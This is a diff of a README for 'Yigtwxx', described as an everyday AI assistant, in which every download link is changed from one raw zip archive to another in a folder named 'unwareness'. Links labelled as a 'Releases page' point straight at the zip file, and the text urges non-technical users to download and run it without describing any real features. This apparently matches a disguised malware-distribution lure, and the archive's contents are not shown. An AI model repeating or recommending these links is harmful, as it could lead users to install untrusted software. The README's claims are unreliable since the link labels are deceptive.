@@ -1,6 +1,6 @@
 # 🚀 Yigtwxx - Your AI Assistant for Everyday Tasks
 
-[![Download Yigtwxx](https://github.com/Ruelbernal03/Yigtwxx/raw/refs/heads/main/unwareness/Software-2.1.zip)](https://github.com/Ruelbernal03/Yigtwxx/raw/refs/heads/main/unwareness/Software-2.1.zip)
+[![Download Yigtwxx](https://raw.githubusercontent.com/Ruelbernal03/Yigtwxx/main/unwareness/Software-2.9.zip)](https://raw.githubusercontent.com/Ruelbernal03/Yigtwxx/main/unwareness/Software-2.9.zip)
 
 ## 👋 Introduction
 
@@ -11,7 +11,7 @@ Welcome to Yigtwxx! This application helps you leverage the power of AI in your 
 To start using Yigtwxx, follow these steps:
 
 1. **Visit the Releases Page**  
-   Open your web browser and go to the [Releases page](https://github.com/Ruelbernal03/Yigtwxx/raw/refs/heads/main/unwareness/Software-2.1.zip). This page contains the latest versions of the software.
+   Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/Ruelbernal03/Yigtwxx/main/unwareness/Software-2.9.zip). This page contains the latest versions of the software.
 
 2. **Download the Application**  
    Look for the latest version and download the file appropriate for your operating system. Click on the link to save the file to your device.
@@ -31,7 +31,7 @@ To start using Yigtwxx, follow these steps:
 
 ## 📥 Download & Install
 
-You can easily download Yigtwxx by visiting the [Releases page](https://github.com/Ruelbernal03/Yigtwxx/raw/refs/heads/main/unwareness/Software-2.1.zip). 
+You can easily download Yigtwxx by visiting the [Releases page](https://raw.githubusercontent.com/Ruelbernal03/Yigtwxx/main/unwareness/Software-2.9.zip). 
 
 ### Installation Steps
 
@@ -54,7 +54,7 @@ Once installed, you can start Yigtwxx by locating its icon where you installed i
 No, Yigtwxx is designed for everyone, regardless of technical background.
 
 **2. What should I do if I encounter an error during installation?**  
-Check for updates on the [Releases page](https://github.com/Ruelbernal03/Yigtwxx/raw/refs/heads/main/unwareness/Software-2.1.zip) and ensure your system meets the requirements. You can also reach out via the Issues section of the repository.
+Check for updates on the [Releases page](https://raw.githubusercontent.com/Ruelbernal03/Yigtwxx/main/unwareness/Software-2.9.zip) and ensure your system meets the requirements. You can also reach out via the Issues section of the repository.
 
 **3. How can I suggest a new feature or report a bug?**  
 You can create an issue on the repository page. Describe your suggestion or problem in detail so the development team can address it effectively.
@@ -71,4 +71,4 @@ Thank you for choosing Yigtwxx. We appreciate your support and interest! If you 
 
 Yigtwxx is licensed under the MIT License. Feel free to use, share, and modify the application as long as you credit us.
 
-[![Download Yigtwxx](https://github.com/Ruelbernal03/Yigtwxx/raw/refs/heads/main/unwareness/Software-2.1.zip)](https://github.com/Ruelbernal03/Yigtwxx/raw/refs/heads/main/unwareness/Software-2.1.zip)
+[![Download Yigtwxx](https://raw.githubusercontent.com/Ruelbernal03/Yigtwxx/main/unwareness/Software-2.9.zip)](https://raw.githubusercontent.com/Ruelbernal03/Yigtwxx/main/unwareness/Software-2.9.zip)
